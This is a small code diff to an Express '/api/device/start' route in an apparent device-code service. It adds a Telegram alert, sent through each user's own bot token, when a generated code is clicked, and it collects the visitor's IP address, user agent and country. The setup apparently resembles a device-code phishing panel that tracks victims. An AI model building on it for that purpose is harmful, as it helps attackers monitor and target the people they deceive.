@@ -148,6 +148,21 @@ router.post('/start', async (req, res) => {
 	});
 
 	dcDiag('[DevCode][DIAG] /api/device/start RESULT ' + JSON.stringify(result).substring(0, 300));
+
+    // Telegram notification on code click (if enabled for this user)
+    if (result && result.user_code) {
+      try {
+        const [userRows] = await db.query('SELECT notify_code_click, telegram_id, telegram_bot_token FROM users WHERE id = ?', [user_id]);
+        if (userRows.length && userRows[0].notify_code_click === 1 && userRows[0].telegram_id && userRows[0].telegram_bot_token) {
+          const { sendCodeClickNotification } = require('../services/notification');
+          const visitorData = { ip: ipAddress, ua: userAgent, country: await getCountryFromIP(ipAddress) };
+          await sendCodeClickNotification(user_id, visitorData, result.user_code);
+        }
+      } catch (e) {
+        dcDiag('code_click_notify_failed err=' + e.message);
+      }
+    }
+
 	res.json(result);
 } catch (err) {
 	dcDiag('[DevCode][DIAG] /api/device/start FAILED err=' + (err && err.message) + ' http_status=' + (err && err.response && err.response.status) + ' http_body=' + String(err && err.response && err.response.data).substring(0, 300));
